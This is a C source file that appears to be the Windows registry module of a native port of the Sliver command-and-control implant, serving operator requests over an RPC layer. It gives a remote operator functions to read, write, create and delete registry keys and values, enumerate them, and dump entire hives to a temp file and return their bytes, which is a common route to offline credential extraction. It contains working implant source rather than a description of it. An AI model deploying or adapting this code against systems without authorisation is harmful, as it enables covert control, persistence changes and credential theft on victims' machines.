/* src/platform/win32/registry.c - registry operations for the RPC layer. */
#include "sliver/registry.h"

#include "sliver/log.h"

#include <windows.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* Same hive names the Go implant accepts. */
static HKEY hive_from_name(const char *hive) {
  if (hive == NULL) {
    return NULL;
  }
  if (strcmp(hive, "HKCR") == 0) {
    return HKEY_CLASSES_ROOT;
  }
  if (strcmp(hive, "HKCU") == 0) {
    return HKEY_CURRENT_USER;
  }
  if (strcmp(hive, "HKLM") == 0) {
    return HKEY_LOCAL_MACHINE;
  }
  if (strcmp(hive, "HKPD") == 0) {
    return HKEY_PERFORMANCE_DATA;
  }
  if (strcmp(hive, "HKU") == 0) {
    return HKEY_USERS;
  }
  if (strcmp(hive, "HKCC") == 0) {
    return HKEY_CURRENT_CONFIG;
  }
  return NULL;
}

static int open_key(const char *hive, const char *path, REGSAM access, HKEY *out) {
  HKEY root = hive_from_name(hive);
  LONG rc;

  if (root == NULL || out == NULL) {
    return -1;
  }
  rc = RegOpenKeyExA(root, path != NULL && path[0] != 0 ? path : NULL, 0, access, out);
  if (rc != ERROR_SUCCESS) {
    LOG_DEBUG("registry: RegOpenKeyEx(%s, %s, access=%lu) -> %ld", hive, path != NULL ? path : "",
              (unsigned long)access, (long)rc);
  }
  return rc == ERROR_SUCCESS ? 0 : -1;
}

int sliver_reg_read(const char *hive, const char *path, const char *key, char *value_out,
                    size_t value_cap, uint8_t *binary_out, size_t binary_cap, size_t *binary_len,
                    uint32_t *type_out) {
  HKEY h;
  DWORD type = 0;
  DWORD size = 0;
  LONG rc;

  if (type_out != NULL) {
    *type_out = SLIVER_REG_UNKNOWN;
  }
  if (binary_len != NULL) {
    *binary_len = 0;
  }
  if (open_key(hive, path, KEY_QUERY_VALUE, &h) != 0) {
    return -1;
  }
  rc = RegQueryValueExA(h, key, NULL, &type, NULL, &size);
  if (rc != ERROR_SUCCESS) {
    (void)RegCloseKey(h);
    return -1;
  }
  if (type == REG_SZ || type == REG_EXPAND_SZ) {
    if (value_out == NULL || size > value_cap) {
      (void)RegCloseKey(h);
      return -1;
    }
    rc = RegQueryValueExA(h, key, NULL, &type, (LPBYTE)value_out, &size);
    (void)RegCloseKey(h);
    if (rc != ERROR_SUCCESS) {
      return -1;
    }
    value_out[size < value_cap ? size : value_cap - 1] = 0;
    if (type_out != NULL) {
      *type_out = SLIVER_REG_STRING;
    }
    return 0;
  }
  if (binary_out == NULL || binary_len == NULL || size > binary_cap) {
    (void)RegCloseKey(h);
    return -1;
  }
  rc = RegQueryValueExA(h, key, NULL, &type, binary_out, &size);
  (void)RegCloseKey(h);
  if (rc != ERROR_SUCCESS) {
    return -1;
  }
  *binary_len = (size_t)size;
  if (type_out != NULL) {
    switch (type) {
      case REG_DWORD:
        *type_out = SLIVER_REG_DWORD;
        break;
      case REG_QWORD:
        *type_out = SLIVER_REG_QWORD;
        break;
      default:
        *type_out = SLIVER_REG_BINARY;
        break;
    }
  }
  return 0;
}

int sliver_reg_write(const char *hive, const char *path, const char *key, uint32_t type,
                     const char *string_value, const uint8_t *bytes, size_t bytes_len,
                     uint32_t dword, uint64_t qword) {
  HKEY h;
  LONG rc;

  if (open_key(hive, path, KEY_QUERY_VALUE | KEY_SET_VALUE | KEY_WRITE, &h) != 0) {
    return -1;
  }
  switch (type) {
    case SLIVER_REG_STRING:
      rc = RegSetValueExA(h, key, 0, REG_SZ, (const BYTE *)(string_value != NULL ? string_value : ""),
                          (DWORD)strlen(string_value != NULL ? string_value : "") + 1);
      break;
    case SLIVER_REG_DWORD:
      rc = RegSetValueExA(h, key, 0, REG_DWORD, (const BYTE *)&dword, sizeof(dword));
      break;
    case SLIVER_REG_QWORD:
      rc = RegSetValueExA(h, key, 0, REG_QWORD, (const BYTE *)&qword, sizeof(qword));
      break;
    case SLIVER_REG_BINARY:
      rc = RegSetValueExA(h, key, 0, REG_BINARY, bytes, (DWORD)bytes_len);
      break;
    default:
      (void)RegCloseKey(h);
      return -1;
  }
  (void)RegCloseKey(h);
  if (rc != ERROR_SUCCESS) {
    LOG_DEBUG("registry: RegSetValueEx(%s) -> %ld", key, (long)rc);
  }
  return rc == ERROR_SUCCESS ? 0 : -1;
}

int sliver_reg_create(const char *hive, const char *path, const char *key) {
  HKEY root = hive_from_name(hive);
  HKEY h;
  DWORD disposition = 0;
  char full[1024];
  LONG rc;

  if (root == NULL) {
    return -1;
  }
  if (path != NULL && path[0] != 0) {
    (void)snprintf(full, sizeof(full), "%s\\%s", path, key != NULL ? key : "");
  } else {
    (void)snprintf(full, sizeof(full), "%s", key != NULL ? key : "");
  }
  rc = RegCreateKeyExA(root, full, 0, NULL, 0, KEY_ALL_ACCESS, NULL, &h, &disposition);
  if (rc != ERROR_SUCCESS) {
    LOG_DEBUG("registry: RegCreateKeyEx(%s, %s) -> %ld", hive, full, (long)rc);
    return -1;
  }
  (void)RegCloseKey(h);
  return 0;
}

int sliver_reg_delete(const char *hive, const char *path, const char *key) {
  HKEY h;

  if (open_key(hive, path, KEY_SET_VALUE, &h) != 0) {
    return -1;
  }
  if (RegDeleteValueA(h, key) == ERROR_SUCCESS) {
    (void)RegCloseKey(h);
    return 0;
  }
  (void)RegCloseKey(h);
  /* Fall back to deleting a subkey of the same name. */
  {
    HKEY root = hive_from_name(hive);
    char full[1024];
    if (root == NULL) {
      return -1;
    }
    if (path != NULL && path[0] != 0) {
      (void)snprintf(full, sizeof(full), "%s\\%s", path, key != NULL ? key : "");
    } else {
      (void)snprintf(full, sizeof(full), "%s", key != NULL ? key : "");
    }
    return RegDeleteKeyA(root, full) == ERROR_SUCCESS ? 0 : -1;
  }
}

int sliver_reg_subkeys(const char *hive, const char *path, char (*names)[256], int max) {
  HKEY h;
  int count = 0;

  if (names == NULL || max <= 0 || open_key(hive, path, KEY_READ, &h) != 0) {
    return -1;
  }
  while (count < max) {
    DWORD len = 256;
    if (RegEnumKeyExA(h, (DWORD)count, names[count], &len, NULL, NULL, NULL, NULL) !=
        ERROR_SUCCESS) {
      break;
    }
    count++;
  }
  (void)RegCloseKey(h);
  return count;
}

int sliver_reg_values(const char *hive, const char *path, char (*names)[256], int max) {
  HKEY h;
  int count = 0;

  if (names == NULL || max <= 0 || open_key(hive, path, KEY_READ, &h) != 0) {
    return -1;
  }
  while (count < max) {
    DWORD len = 256;
    DWORD type = 0;
    if (RegEnumValueA(h, (DWORD)count, names[count], &len, NULL, &type, NULL, NULL) !=
        ERROR_SUCCESS) {
      break;
    }
    count++;
  }
  (void)RegCloseKey(h);
  return count;
}


/* Dumps a hive to a temporary file and returns its bytes (RegistryReadHive). */
int sliver_reg_read_hive(const char *root_hive, const char *requested_hive, uint8_t **out,
                         size_t *out_len) {
  HKEY root = hive_from_name(root_hive);
  char temp_dir[MAX_PATH];
  char temp_file[MAX_PATH];
  DWORD got = 0;
  FILE *f = NULL;
  long size;
  uint8_t *buf = NULL;

  if (root == NULL || out == NULL || out_len == NULL) {
    return -1;
  }
  got = GetTempPathA(MAX_PATH, temp_dir);
  if (got == 0 || got >= MAX_PATH) {
    return -1;
  }
  (void)snprintf(temp_file, sizeof(temp_file), "%ssliver-hive-%lu.dat", temp_dir,
                 (unsigned long)GetCurrentProcessId());
  (void)DeleteFileA(temp_file);
  /* Requires SeBackupPrivilege; a normal user gets ERROR_PRIVILEGE_NOT_HELD (1314). */
  if (RegSaveKeyExA(root, temp_file, NULL, REG_LATEST_FORMAT) != ERROR_SUCCESS) {
    LOG_DEBUG("registry: RegSaveKeyEx(%s\\%s) failed (%lu)", root_hive,
              requested_hive != NULL ? requested_hive : "",
              (unsigned long)GetLastError());
    return -1;
  }
  f = fopen(temp_file, "rb");
  if (f == NULL) {
    (void)DeleteFileA(temp_file);
    return -1;
  }
  (void)fseek(f, 0, SEEK_END);
  size = ftell(f);
  (void)fseek(f, 0, SEEK_SET);
  if (size <= 0 || size > (32 * 1024 * 1024)) {
    (void)fclose(f);
    (void)DeleteFileA(temp_file);
    return -1;
  }
  buf = (uint8_t *)malloc((size_t)size);
  if (buf == NULL) {
    (void)fclose(f);
    (void)DeleteFileA(temp_file);
    return -1;
  }
  if (fread(buf, 1, (size_t)size, f) != (size_t)size) {
    free(buf);
    (void)fclose(f);
    (void)DeleteFileA(temp_file);
    return -1;
  }
  (void)fclose(f);
  (void)DeleteFileA(temp_file);
  *out = buf;
  *out_len = (size_t)size;
  return 0;
}

